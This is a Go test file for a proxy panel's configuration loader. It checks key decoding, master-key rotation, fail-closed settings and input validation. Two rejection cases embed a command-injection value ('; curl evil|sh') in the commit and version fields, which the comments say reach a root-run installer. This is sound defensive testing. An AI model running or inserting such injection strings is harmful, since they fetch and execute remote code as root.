package config

import (
	"encoding/base64"
	"strings"
	"testing"
)

// testTelemtSHA is the pinned sha256 of the telemt 3.5.6 x86_64 release tarball, the same
// value .env.example ships.
const testTelemtSHA = "8c3a22801dd20854e1d6c20f32539adf8ffb0cb5483fc1113bbeb5d92ebdb61b"

func env(m map[string]string) func(string) string {
	return func(k string) string { return m[k] }
}

func TestLoadRequiresDatabaseURL(t *testing.T) {
	_, err := Load(env(map[string]string{}))
	if err == nil {
		t.Fatal("expected error for missing DATABASE_URL")
	}
}

func TestLoadDefaultsAndDecodesKeys(t *testing.T) {
	key := base64.StdEncoding.EncodeToString(make([]byte, 32))
	cfg, err := Load(env(map[string]string{
		"DATABASE_URL":         "postgres://u:p@localhost/db",
		"MASTER_KEY":           key,
		"SESSION_SECRET":       key,
		"METRICS_TOKEN":        "t0ken",
		"TELEMT_SHA256_X86_64": testTelemtSHA,
	}))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.HTTPAddr != ":8080" || cfg.DataDir != "./data" || cfg.NodeDriver != "gateway" {
		t.Fatalf("bad defaults: %+v", cfg)
	}
	if len(cfg.MasterKey) != 32 || cfg.MasterKeyVersion != 1 {
		t.Fatalf("master key not decoded: %+v", cfg)
	}
	if cfg.TProxyCommit != "52a5feb7fac38f68da5afef9cedd9b3bfc8473ca" {
		t.Fatalf("bad tproxy commit default: %s", cfg.TProxyCommit)
	}
	if cfg.TelemtVersion != DefaultTelemtVersion || cfg.TelemtSHA256 != testTelemtSHA {
		t.Fatalf("bad telemt pin: %s %s", cfg.TelemtVersion, cfg.TelemtSHA256)
	}
}

func TestLoadRejectsShortMasterKey(t *testing.T) {
	short := base64.StdEncoding.EncodeToString(make([]byte, 16))
	_, err := Load(env(map[string]string{
		"DATABASE_URL": "postgres://u:p@localhost/db", "MASTER_KEY": short, "SESSION_SECRET": short,
	}))
	if err == nil {
		t.Fatal("expected error for 16-byte key")
	}
}

// TestLoadRequiresMetricsTokenInGatewayMode covers I1: /metrics sits outside the auth group
// on the public domain, so an empty METRICS_TOKEN must be a startup error, not an open door.
func TestLoadRequiresMetricsTokenInGatewayMode(t *testing.T) {
	key := base64.StdEncoding.EncodeToString(make([]byte, 32))
	base := map[string]string{
		"DATABASE_URL": "postgres://u:p@localhost/db", "MASTER_KEY": key, "SESSION_SECRET": key,
		"TELEMT_SHA256_X86_64": testTelemtSHA,
	}
	if _, err := Load(env(base)); err == nil {
		t.Fatal("gateway mode with no METRICS_TOKEN must fail closed")
	}
	mock := map[string]string{}
	for k, v := range base {
		mock[k] = v
	}
	mock["NODE_DRIVER"] = "mock"
	if _, err := Load(env(mock)); err != nil {
		t.Fatalf("mock mode must not require METRICS_TOKEN: %v", err)
	}
}

// TestLoadRejectsBadTProxyCommit covers I2: the value is interpolated into the root-run
// installer script.
func TestLoadRejectsBadTProxyCommit(t *testing.T) {
	key := base64.StdEncoding.EncodeToString(make([]byte, 32))
	for _, bad := range []string{"abc", "main", "deadbeef; curl evil|sh", "DEADBEEF", ""} {
		env := map[string]string{
			"DATABASE_URL": "postgres://u:p@localhost/db", "MASTER_KEY": key, "SESSION_SECRET": key,
			"METRICS_TOKEN": "t0ken", "TELEMT_SHA256_X86_64": testTelemtSHA, "TPROXY_COMMIT": bad,
		}
		if bad == "" {
			continue // empty falls back to the built-in default, which is valid
		}
		if _, err := Load(func(k string) string { return env[k] }); err == nil {
			t.Errorf("TPROXY_COMMIT %q accepted", bad)
		}
	}
}

// baseEnv is a minimal valid environment; callers override single keys.
func baseEnv(over map[string]string) func(string) string {
	key := base64.StdEncoding.EncodeToString(make([]byte, 32))
	m := map[string]string{
		"DATABASE_URL": "postgres://u:p@localhost/db",
		"MASTER_KEY":   key, "SESSION_SECRET": key, "METRICS_TOKEN": "t0ken",
		"TELEMT_SHA256_X86_64": testTelemtSHA,
	}
	for k, v := range over {
		m[k] = v
	}
	return env(m)
}

func TestLoadValidatesNodeDriver(t *testing.T) {
	for _, d := range []string{"gateway", "mock"} {
		if _, err := Load(baseEnv(map[string]string{"NODE_DRIVER": d})); err != nil {
			t.Errorf("NODE_DRIVER=%s rejected: %v", d, err)
		}
	}
	// values are trimmed by Load, so "gateway " is legitimately accepted
	for _, d := range []string{"Gateway", "grpc", "none"} {
		if _, err := Load(baseEnv(map[string]string{"NODE_DRIVER": d})); err == nil {
			t.Errorf("NODE_DRIVER=%q accepted", d)
		}
	}
}

func TestLoadIntervals(t *testing.T) {
	cfg, err := Load(baseEnv(nil))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.ApplyInterval != 45 || cfg.OfflineAfter != 90 {
		t.Fatalf("bad interval defaults: %d %d", cfg.ApplyInterval, cfg.OfflineAfter)
	}
	cfg, err = Load(baseEnv(map[string]string{"APPLY_INTERVAL": "10", "OFFLINE_AFTER": "20"}))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.ApplyInterval != 10 || cfg.OfflineAfter != 20 {
		t.Fatalf("intervals not read: %d %d", cfg.ApplyInterval, cfg.OfflineAfter)
	}
	if _, err := Load(baseEnv(map[string]string{"APPLY_INTERVAL": "soon"})); err == nil {
		t.Error("non-numeric APPLY_INTERVAL accepted")
	}
	if _, err := Load(baseEnv(map[string]string{"OFFLINE_AFTER": "1m"})); err == nil {
		t.Error("non-numeric OFFLINE_AFTER accepted")
	}
}

func TestLoadMasterKeyVersionAndOldKeys(t *testing.T) {
	k1 := base64.StdEncoding.EncodeToString(bytesOf(1))
	k2 := base64.StdEncoding.EncodeToString(bytesOf(2))
	cfg, err := Load(baseEnv(map[string]string{
		"MASTER_KEY_VERSION": "3", "MASTER_KEY_V1": k1, "MASTER_KEY_V2": k2,
	}))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.MasterKeyVersion != 3 || len(cfg.OldMasterKeys) != 2 {
		t.Fatalf("old keys not collected: v=%d keys=%v", cfg.MasterKeyVersion, cfg.OldMasterKeys)
	}
	if string(cfg.OldMasterKeys[1]) != string(bytesOf(1)) || string(cfg.OldMasterKeys[2]) != string(bytesOf(2)) {
		t.Fatal("old keys decoded to the wrong bytes")
	}
	// A key at or above the current version is never read, so it cannot shadow the active key.
	cfg, err = Load(baseEnv(map[string]string{"MASTER_KEY_VERSION": "2", "MASTER_KEY_V2": k2, "MASTER_KEY_V3": k1}))
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := cfg.OldMasterKeys[2]; ok {
		t.Fatal("MASTER_KEY_V<current> must not be loaded as an old key")
	}
	if _, ok := cfg.OldMasterKeys[3]; ok {
		t.Fatal("MASTER_KEY_V<future> must not be loaded as an old key")
	}
	for _, bad := range []string{"0", "-1", "one", "1.5"} {
		if _, err := Load(baseEnv(map[string]string{"MASTER_KEY_VERSION": bad})); err == nil {
			t.Errorf("MASTER_KEY_VERSION=%q accepted", bad)
		}
	}
	if _, err := Load(baseEnv(map[string]string{"MASTER_KEY_VERSION": "2", "MASTER_KEY_V1": "not-base64!"})); err == nil {
		t.Error("undecodable MASTER_KEY_V1 accepted")
	}
}

func bytesOf(b byte) []byte {
	out := make([]byte, 32)
	for i := range out {
		out[i] = b
	}
	return out
}

// TestLoadRequiresTelemtSHAInGatewayMode: the install script makes root run the downloaded
// telemt tarball, and the checksum is the only thing that says it is the right one.
func TestLoadRequiresTelemtSHAInGatewayMode(t *testing.T) {
	key := base64.StdEncoding.EncodeToString(make([]byte, 32))
	base := map[string]string{
		"DATABASE_URL": "postgres://u:p@localhost/db", "MASTER_KEY": key, "SESSION_SECRET": key,
		"METRICS_TOKEN": "t0ken",
	}
	if _, err := Load(env(base)); err == nil {
		t.Fatal("gateway mode with no TELEMT_SHA256_X86_64 must fail closed")
	}
	mock := map[string]string{"NODE_DRIVER": "mock"}
	for k, v := range base {
		mock[k] = v
	}
	if _, err := Load(env(mock)); err != nil {
		t.Fatalf("mock mode must not require the telemt pin: %v", err)
	}
}

func TestLoadValidatesTelemtPin(t *testing.T) {
	for _, bad := range []string{"abc", "3.5", "3.5.5-rc1", "3.5.5; curl evil|sh", "v3.5.5"} {
		if _, err := Load(baseEnv(map[string]string{"TELEMT_VERSION": bad})); err == nil {
			t.Errorf("TELEMT_VERSION %q accepted", bad)
		}
	}
	if _, err := Load(baseEnv(map[string]string{"TELEMT_VERSION": "10.0.12"})); err != nil {
		t.Errorf("valid TELEMT_VERSION rejected: %v", err)
	}
	for _, bad := range []string{"abc", testTelemtSHA + "00", "zz" + testTelemtSHA[2:]} {
		if _, err := Load(baseEnv(map[string]string{"TELEMT_SHA256_X86_64": bad})); err == nil {
			t.Errorf("TELEMT_SHA256_X86_64 %q accepted", bad)
		}
	}
	// Operators paste checksums out of release pages, which sometimes upper-case them.
	cfg, err := Load(baseEnv(map[string]string{"TELEMT_SHA256_X86_64": strings.ToUpper(testTelemtSHA)}))
	if err != nil {
		t.Fatalf("upper-case checksum rejected: %v", err)
	}
	if cfg.TelemtSHA256 != testTelemtSHA {
		t.Fatalf("checksum not normalised: %s", cfg.TelemtSHA256)
	}
}

// TestLoadGitHubAndUpdateCheck covers the update-check knobs: a sane default
// repo, an opt-out that is exactly "false", and a repo slug that is validated
// because it is interpolated into an outbound URL.
func TestLoadGitHubAndUpdateCheck(t *testing.T) {
	cfg, err := Load(baseEnv(nil))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.GitHubRepo != "greenpandorik/tgproxy-panel" || cfg.GitHubToken != "" || !cfg.UpdateCheck {
		t.Fatalf("bad update-check defaults: repo=%q token=%q check=%v", cfg.GitHubRepo, cfg.GitHubToken, cfg.UpdateCheck)
	}
	cfg, err = Load(baseEnv(map[string]string{
		"GITHUB_REPO": "acme/panel-2.x", "GITHUB_TOKEN": "ghp_secret", "UPDATE_CHECK": "false",
	}))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.GitHubRepo != "acme/panel-2.x" || cfg.GitHubToken != "ghp_secret" || cfg.UpdateCheck {
		t.Fatalf("update-check values not read: repo=%q token=%q check=%v", cfg.GitHubRepo, cfg.GitHubToken, cfg.UpdateCheck)
	}
	for _, v := range []string{"true", "1", "yes", "no", "0"} {
		cfg, err = Load(baseEnv(map[string]string{"UPDATE_CHECK": v}))
		if err != nil {
			t.Fatal(err)
		}
		if !cfg.UpdateCheck {
			t.Errorf("UPDATE_CHECK=%q must not disable the check; only \"false\" does", v)
		}
	}
	for _, bad := range []string{"noslash", "a/b/c", "a b/c", "/panel", "acme/", "acme/panel?x=1", "acme/pa nel"} {
		if _, err := Load(baseEnv(map[string]string{"GITHUB_REPO": bad})); err == nil {
			t.Errorf("GITHUB_REPO %q accepted", bad)
		}
	}
}
